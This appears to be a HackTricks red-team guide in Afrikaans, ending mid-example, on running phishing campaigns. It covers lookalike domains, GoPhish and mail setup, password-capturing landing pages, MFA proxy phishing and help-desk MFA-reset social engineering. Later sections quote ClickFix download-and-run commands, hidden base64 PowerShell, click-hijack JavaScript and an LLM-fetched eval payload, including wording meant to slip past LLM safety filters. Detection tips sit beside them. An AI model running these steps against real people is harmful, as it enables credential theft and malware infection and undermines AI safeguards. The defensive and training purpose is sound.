# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Recon die slagoffer
1. Kies die **slagoffer-domein**.
2. Doen basiese web-enumerasie **soek vir login portals** wat deur die slagoffer gebruik word en **besluit** watter een jy gaan **naboots**.
3. Gebruik **OSINT** om **emails te vind**.
2. Berei die omgewing voor
1. **Koop die domein** wat jy gaan gebruik vir die phishing-assessering
2. **Konfigureer die email service**-verwante rekords (SPF, DMARC, DKIM, rDNS)
3. Konfigureer die VPS met **gophish**
3. Berei die veldtog voor
1. Berei die **email template** voor
2. Berei die **web page** voor om die credentials te steel
4. Begin die veldtog!

## Genereer soortgelyke domeinname of koop 'n vertroude domein

### Domain Name Variation Techniques

- **Keyword**: Die domeinnaam **bevat** 'n belangrike **keyword** van die oorspronklike domein (bv., zelster.com-management.com).
- **hypened subdomain**: Verander die **punt na 'n koppelteken** van 'n subdomein (bv., www-zelster.com).
- **New TLD**: Dieselfde domein met 'n **new TLD** (bv., zelster.org)
- **Homoglyph**: Dit **vervang** 'n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **ruil twee letters om** binne die domeinnaam (bv., zelsetr.com).
- **Singularization/Pluralization**: Voeg “s” by die einde van die domeinnaam by of verwyder dit (bv., zeltsers.com).
- **Omission**: Dit **verwyder een** van die letters uit die domeinnaam (bv., zelser.com).
- **Repetition:** Dit **herhaal een** van die letters in die domeinnaam (bv., zeltsser.com).
- **Replacement**: Soos homoglyph maar minder stealthy. Dit vervang een van die letters in die domeinnaam, miskien met 'n letter naby aan die oorspronklike letter op die sleutelbord (bv, zektser.com).
- **Subdomained**: Voeg 'n **punt** binne die domeinnaam in (bv., ze.lster.com).
- **Insertion**: Dit **voeg 'n letter** by in die domeinnaam (bv., zerltser.com).
- **Missing dot**: Voeg die TLD aan die domeinnaam toe. (bv., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is 'n **moontlikheid dat een van sommige bits wat gestoor is of in kommunikasie is, outomaties omgekeer kan word** as gevolg van verskeie faktore soos sonvlamme, kosmiese strale, of hardewarefoute.

Wanneer hierdie konsep **op DNS requests toegepas word**, is dit moontlik dat die **domein wat deur die DNS server ontvang word** nie dieselfde is as die domein wat aanvanklik aangevra is nie.

Byvoorbeeld, 'n enkele bit-modifikasie in die domein "windows.com" kan dit verander na "windnws.com."

Aanvallers kan **hiervan voordeel trek deur verskeie bit-flipping domeine te registreer** wat soortgelyk is aan die slagoffer se domein. Hulle doel is om wettige gebruikers na hul eie infrastruktuur te herlei.

Vir meer inligting lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Koop 'n vertroude domein

Jy kan soek in [https://www.expireddomains.net/](https://www.expireddomains.net) vir 'n vervalde domein wat jy kan gebruik.\
Om seker te maak dat die vervalde domein wat jy gaan koop **reeds 'n goeie SEO het** kan jy soek hoe dit gekategoriseer is in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ontdek Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige email addresses te **ontdek** of die **een wat jy reeds ontdek het** te **verifieer**, kan jy kyk of jy hulle smtp servers van die slagoffer kan brute-force. [Leer hoe om email address hier te verifieer/ontdek](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moet ook nie vergeet dat as die gebruikers **enige web portal gebruik om hul mails te benader**, jy kan kyk of dit kwesbaar is vir **username brute force**, en die kwesbaarheid uitbuit indien moontlik.

## Konfigureer GoPhish

### Installation

Jy kan dit aflaai van [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af en decomprimeer dit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit\
Jy sal 'n password vir die admin user in poort 3333 in die output gegee word. Daarom, gaan na daardie poort en gebruik daardie credentials om die admin password te verander. Jy mag dalk daardie poort na local moet tunnel:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfigurasie

**TLS-sertifikaat konfigurasie**

Voor hierdie stap moes jy **reeds die domein gekoop** het wat jy gaan gebruik en dit moet **na die IP van die VPS** wys waar jy **gophish** konfigureer.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Poskonfigurasie**

Begin installeer: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes binne /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Wysig uiteindelik die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**

Skep nou 'n **DNS A-rekord** van `mail.<domain>` wat na die **IP-adres** van die VPS wys, en 'n **DNS MX-rekord** wat na `mail.<domain>` wys

Kom ons toets nou om 'n e-pos te stuur:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-konfigurasie**

Stop die uitvoering van gophish en laat ons dit konfigureer.\
Verander `/opt/gophish/config.json` na die volgende (let op die gebruik van https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigureer gophish-diens**

Om die gophish-diens te skep sodat dit outomaties begin en as ’n diens bestuur kan word, kan jy die lêer `/etc/init.d/gophish` met die volgende inhoud skep:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Voltooi die opstelling van die diens en kontroleer dit deur:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigureer mailbediener en domein

### Wag & wees legitiem

Hoe ouer ’n domein is, hoe minder waarskynlik is dit dat dit as spam gevang gaan word. Dan moet jy so lank as moontlik wag (ten minste 1 week) voor die phishing assessment. Verder, as jy ’n bladsy oor ’n reputational sector sit, sal die reputasie wat verkry word beter wees.

Let daarop dat selfs al moet jy ’n week wag, jy nou alles kan klaar konfigureer.

### Konfigureer Reverse DNS (rDNS) rekord

Stel ’n rDNS (PTR) rekord op wat die IP-adres van die VPS na die domeinnaam laat oplos.

### Sender Policy Framework (SPF) Record

Jy moet **’n SPF rekord vir die nuwe domein konfigureer**. As jy nie weet wat ’n SPF rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF policy te genereer (gebruik die IP van die VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

This is the content that must be set inside a TXT record inside the domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-gebaseerde Boodskapverifikasie, Verslagdoening & Nakoming (DMARC) Record

Jy moet **'n DMARC-record vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC-record is nie [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet 'n nuwe DNS TXT-record skep wat na die hostname `_dmarc.<domain>` wys met die volgende inhoud:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Jy moet **'n DKIM vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC record is nie [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hierdie tutoriaal is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Jy moet albei B64 values wat die DKIM key genereer, saamvoeg:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasie-telling

Jy kan dit doen met behulp van [https://www.mail-tester.com/](https://www.mail-tester.com)\
Gaan net na die bladsy en stuur 'n e-pos na die adres wat hulle vir jou gee:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Jy kan ook **jou e-poskonfigurasie nagaan** deur ’n e-pos te stuur na `check-auth@verifier.port25.com` en **die antwoord te lees** (hiervoor sal jy **poort 25** moet **oopmaak** en die antwoord sien in die lêer _/var/mail/root_ as jy die e-pos as root stuur).\
Kontroleer dat jy al die toetse slaag:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Jy kan ook **’n boodskap stuur na ’n Gmail onder jou beheer**, en die **e-pos se kopskrifte** in jou Gmail-inkassie nagaan; `dkim=pass` moet teenwoordig wees in die `Authentication-Results` kopskrifveld.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Verwydering van Spamhouse Blacklist

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan vir jou aandui of jou domein deur spamhouse geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwydering van Microsoft Blacklist

​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep & Begin GoPhish Kampanje

### Sending Profile

- Stel 'n **naam in om die** sender profile te identifiseer
- Besluit vanaf watter rekening jy die phishing emails gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan die username en password leeg laat, maar maak seker dat jy Ignore Certificate Errors merk

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die "**Send Test Email**"-funksionaliteit te gebruik om te toets dat alles werk.\
> Ek sal aanbeveel om die toets emails na 10min mails addresses te stuur om te vermy dat jy geblacklist word wanneer jy toetse doen.

### Email Template

- Stel 'n **naam in om die** template te identifiseer
- Skryf dan 'n **subject** (niks vreemds nie, net iets wat jy sou verwag om in 'n gewone email te lees)
- Maak seker dat jy "**Add Tracking Image**" gemerk het
- Skryf die **email template** (jy kan veranderlikes gebruik soos in die volgende voorbeeld):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **om die geloofwaardigheid van die e-pos te verhoog**, word dit aanbeveel om ’n handtekening van ’n e-pos van die kliënt te gebruik. Voorstelle:

- Stuur ’n e-pos na ’n **nie-bestaande adres** en kyk of die antwoord enige handtekening het.
- Soek vir **openbare e-posse** soos info@ex.com of press@ex.com of public@ex.com en stuur vir hulle ’n e-pos en wag vir die antwoord.
- Probeer om **’n geldige ontdekte** e-pos te kontak en wag vir die antwoord

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM challenges met sommige spesiaal vervaardigde lêers/dokumente wil steel [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Skryf ’n **naam**
- **Skryf die HTML-kode** van die webblad. Let daarop dat jy webblaaie kan **import**.
- Merk **Capture Submitted Data** en **Capture Passwords**
- Stel ’n **herleiding**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en ’n paar toetse plaaslik moet doen (miskien met ’n Apache server) **totdat jy tevrede is met die resultate.** Skryf dan daardie HTML-kode in die blokkie.\
> Let daarop dat as jy **statiese resources** vir die HTML nodig het (miskien sommige CSS en JS bladsye) jy hulle in _**/opt/gophish/static/endpoint**_ kan stoor en hulle dan vanaf _**/static/\<filename>**_ kan toegang kry

> [!TIP]
> Vir die herleiding kan jy die gebruikers **na die wettige hoofwebblad** van die slagoffer herlei, of hulle byvoorbeeld na _/static/migration.html_ herlei, sit ’n **spinning wheel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes en dui dan aan dat die proses suksesvol was**.

### Users & Groups

- Stel ’n naam
- **Voer die data in** (let daarop dat om die template vir die voorbeeld te gebruik jy die voornaam, van en e-posadres van elke gebruiker nodig het)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Skep uiteindelik ’n campaign deur ’n naam, die email template, die landing page, die URL, die sending profile en die group te kies. Let daarop dat die URL die skakel sal wees wat na die slagoffers gestuur word

Let daarop dat die **Sending Profile laat jou toe om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos sal lyk**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ek sal aanbeveel om die **toets-e-posse na 10min mails addresses** te stuur om te vermy dat jy op swartlyste beland terwyl jy toetse doen.

Sodra alles gereed is, begin net die campaign!

## Website Cloning

As jy om enige rede die website wil kloon, kyk na die volgende bladsy:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing assessments (hoofsaaklik vir Red Teams) sal jy ook wil **lêers stuur wat ’n soort backdoor bevat** (miskien ’n C2 of dalk net iets wat ’n authentication sal trigger).\
Kyk na die volgende bladsy vir ’n paar voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is nogal slim, aangesien jy ’n regte webwerf namaak en die inligting insamel wat deur die gebruiker ingevoer word. Ongelukkig, as die gebruiker nie die korrekte wagwoord ingetik het nie of as die toepassing wat jy vervals het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die misleide gebruiker te impersonate nie**.

Dit is waar tools soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie tool sal jou toelaat om ’n MitM-agtige aanval te genereer. Basies werk die aanvalle op die volgende manier:

1. Jy **impersonate die login**-vorm van die regte webblad.
2. Die gebruiker **stuur** sy **credentials** na jou vals bladsy en die tool stuur dit na die regte webblad, **en kontroleer of die credentials werk**.
3. As die account met **2FA** gekonfigureer is, sal die MitM-bladsy daarvoor vra en sodra die **gebruiker dit invoer** sal die tool dit na die regte webblad stuur.
4. Sodra die gebruiker geverifieer is, sal jy (as attacker) **die credentials, die 2FA, die cookie en enige inligting** van elke interaksie vasgevang het terwyl die tool ’n MitM uitvoer.

### Via VNC

Wat as jy in plaas daarvan om **die slagoffer na ’n kwaadwillige bladsy** met dieselfde voorkoms as die oorspronklike een te stuur, hom na ’n **VNC session met ’n browser gekoppel aan die regte webblad** stuur? Jy sal kan sien wat hy doen, die wagwoord steel, die MFA wat gebruik is, die cookies...\
Jy kan dit doen met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Uiteraard is een van die beste maniere om te weet of jy gevang is om **jou domain binne blacklists te soek**. As dit gelys verskyn, is jou domain op een of ander manier as suspicions gedetecteer.\
Een maklike manier om te kyk of jou domain in enige blacklist verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik

Daar is egter ander maniere om te weet of die slagoffer **aktief na suspicions phishing activity in the wild soek** soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan **’n domain koop met ’n baie soortgelyke naam** as die slagoffer se domain **en/of ’n certificate genereer** vir ’n **subdomain** van ’n domain wat deur jou beheer word **wat die keyword** van die slagoffer se domain **bevat**. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** met hulle uitvoer, sal jy weet dat **hy aktief na** suspicious domains soek en jy baie stealth moet wees.

### Evaluate the phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious) om te evalueer of jou e-pos in die spam folder gaan beland of of dit geblokkeer of suksesvol gaan wees.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion sets slaan toenemend email lures heeltemal oor en **teiken direk die service-desk / identity-recovery workflow** om MFA te verslaan. Die aanval is heeltemal "living-off-the-land": sodra die operator geldige credentials besit, pivot hy met ingeboude admin tooling – geen malware is nodig nie.

### Attack flow
1. Recon the victim
* Versamel persoonlike & korporatiewe besonderhede van LinkedIn, data breaches, openbare GitHub, ens.
* Identifiseer hoëwaarde-identiteite (executives, IT, finance) en lys die **presiese help-desk proses** vir wagwoord / MFA reset.
2. Real-time social engineering
* Bel, Teams of chat die help-desk terwyl jy die target impersonate (dikwels met **spoofed caller-ID** of **cloned voice**).
* Gee die vroeër-versamelde PII om knowledge-based verification te slaag.
* Oortuig die agent om die **MFA secret te reset** of ’n **SIM-swap** op ’n geregistreerde selfoonnommer uit te voer.
3. Immediate post-access actions (≤60 min in real cases)
* Vestig ’n foothold deur enige web SSO portal.
* Lys AD / AzureAD met built-ins (geen binaries laat val nie):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement met **WMI**, **PsExec**, of wettige **RMM** agents wat reeds in die environment gewhitelist is.

### Detection & Mitigation
* Behandel help-desk identity recovery as ’n **privileged operation** – vereis step-up auth & manager approval.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA** reëls wat waarsku op:
* MFA method changed + authentication from new device / geo.
* Onmiddellike elevation van dieselfde principal (user-→-admin).
* Neem help-desk calls op en dwing ’n **call-back na ’n reeds-geregistreerde nommer** af voor enige reset.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-geresette accounts nie outomaties hoë-privilege tokens erf nie.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews vergoed vir die koste van high-touch ops met mass attacks wat **search engines & ad networks in die delivery channel** verander.

1. **SEO poisoning / malvertising** stoot ’n vals resultaat soos `chromium-update[.]site` na bo in search ads.
2. Die slagoffer laai ’n klein **first-stage loader** af (dikwels JS/HTA/ISO). Voorbeelde wat deur Unit 42 gesien is:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, en trek dan ’n **silent loader** wat besluit – *in realtime* – of dit gaan ontplooi:
* RAT (bv. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blokkeer newly-registered domains & dwing **Advanced DNS / URL Filtering** af op *search-ads* sowel as e-mail.
* Beperk software installation tot signed MSI / Store packages, weier `HTA`, `ISO`, `VBS` execution deur policy.
* Monitor vir child processes van browsers wat installers oopmaak:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt vir LOLBins wat gereeld misbruik word deur first-stage loaders (bv. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Sommige vals software portals hou die sigbare download `href` na die **regte** GitHub/release URL, maar hijack die **eerste** user interaction in JavaScript en stuur die slagoffer eerder in ’n **Traffic Distribution System (TDS)** chain.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Kenmerke:
- Die hook loop gewoonlik in die **capture phase** (`true`) op `document`, so dit vuur voor site handlers.
- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect gekoppel te hou aan ’n geldige **user gesture** en popup-blocker bypass te verbeter.
- Sommige variante open vooraf `about:blank` of sintetiseer `<a target="_blank">` klikke en ken eers later die TDS URL toe.
- Browser-side caps leef gewoonlik in `localStorage`, so die **first click** kan malware bereik terwyl refreshes/retries terugval op die benig-lykende sigbare skakel.
- Die TDS kan gate volgens referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context, en per-session counters, wat analyst replays nie-deterministies maak.

Verdediger-idees:
- Vergelyk die **displayed** `href` met die **actual** navigation target wat by click time gegenereer word.
- Soek vir `document.addEventListener(..., true)` handlers wat beide `preventDefault()` en `stopImmediatePropagation()` aanroep rondom `window.open`, `about:blank`, of synthetic anchor clicks.
- Behandel clusters van nuut geregistreerde software-download domains wat almal dieselfde CloudFront/JS stage laai as ’n high-signal SEO-poisoning/TDS pattern.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Sommige TDS branches eindig in ’n fake verification page (Cloudflare/IUAM style) wat vir die victim sê om ’n trusted Windows binary soos te run:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Opmerkings:
- `mshta.exe` voer die **HTA/VBScript aan die begin van die response** uit, selfs al gee die URL voor om ’n `.7z`-argief te wees; aangehegte argiefdata kan suiwer misleiding wees.
- Volg-op stadiums lieg dikwels verder oor lêertipe (`.rtf` vir PowerShell, `.asar` vir Python, ZIPs met opgestopte binaries) en skakel dan oor na **manual PE mapping / in-memory execution**.
- As jy op een van hierdie kettings reageer, bewaar **network + memory from the first successful run**: latere herhalings kan slegs ’n goedaardige installer/SFX-pad wys of misluk omdat die payload/key release aan die oorspronklike TDS-session gekoppel was.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: gekloonde nasionale CERT-advisory met ’n **Update**-knoppie wat stap-vir-stap “fix”-instruksies wys. Slagoffers word vertel om ’n batch te laat loop wat ’n DLL aflaai en dit via `rundll32` uitvoer.
* Tipiese batch-ketting waargeneem:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` plaas die payload na `%TEMP%`, ’n kort sleep verberg network jitter, en dan roep `rundll32` die exported entrypoint (`notepad`) aan.
* Die DLL beacon host identity en poll C2 elke paar minute. Remote tasking kom aan as **base64-encoded PowerShell** wat hidden en met policy bypass uitgevoer word:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dit behou C2-flexibility (server kan take ruil sonder om die DLL op te dateer) en verberg console windows. Soek vir PowerShell children van `rundll32.exe` wat `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik.
* Defenders kan soek na HTTP(S)-callbacks van die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute polling intervals ná DLL-load.

---

## AI-Enhanced Phishing Operations
Aanvallers ketting nou **LLM & voice-clone APIs** vir volledig gepersonaliseerde lures en real-time interaksie.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Genereer & stuur >100 k e-posse / SMS met gerandomiseerde bewoording & tracking links.|
|Generative AI|Produseer *one-off* e-posse wat openbare M&A, inside jokes van social media noem; deep-fake CEO-stem in callback scam.|
|Agentic AI|Registreer outonoom domains, skraap open-source intel, skep volgende-fase mails wanneer ’n slagoffer klik maar nie creds indien nie.|

**Defence:**
• Voeg **dynamic banners** by wat boodskappe uit ontrusted automation uitlig (via ARC/DKIM anomalies).
• Ontplooi **voice-biometric challenge phrases** vir hoërisiko foonversoeke.
• Simuleer voortdurend AI-gegenereerde lures in awareness programmes – static templates is verouderd.

Sien ook – agentic browsing abuse vir credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Sien ook – AI agent abuse van local CLI tools en MCP (vir secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Aanvallers kan goedaardig-lykende HTML stuur en **die stealer by runtime genereer** deur ’n **trusted LLM API** vir JavaScript te vra, en dit dan in-browser uit te voer (bv. `eval` of dynamic `<script>`).

1. **Prompt-as-obfuscation:** enkodeer exfil URLs/Base64 strings in die prompt; herhaal bewoording om safety filters te omseil en hallucinations te verminder.
2. **Client-side API call:** by load roep JS ’n public LLM (Gemini/DeepSeek/etc.) of ’n CDN proxy; slegs die prompt/API call is in static HTML teenwoordig.
3. **Assemble & exec:** konkateniseer die response en voer dit uit (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** gegenereerde code personaliseer die lokmiddel (bv. LogoKit-token-ontleding) en stuur creds na die prompt-hidden endpoint.

**Ontduikingseienskappe**
- Verkeer tref goed-bekende LLM-domeine of betroubare CDN-proxies; soms via WebSockets na ’n backend.
- Geen statiese payload; kwaadwillige JS bestaan slegs ná render.
- Nie-deterministiese generasies lewer **unikke** stealers per sessie.

**Opsporingsidees**
- Laat sandboxes met JS geaktiveer loop; vlag **runtime `eval`/dinamiese script-skepping afkomstig van LLM responses**.
- Soek na front-end POSTs na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggestuurde teks.
- Stel waarskuwings op vir ongesanksioneerde LLM-domeine in kliëntverkeer plus daaropvolgende credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Behalwe vir klassieke push-bombing, **forseer operateurs bloot ’n nuwe MFA-registrasie** tydens die help-desk oproep, wat die gebruiker se bestaande token ongeldig maak. Enige daaropvolgende login prompt lyk legitim vir die slagoffer.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
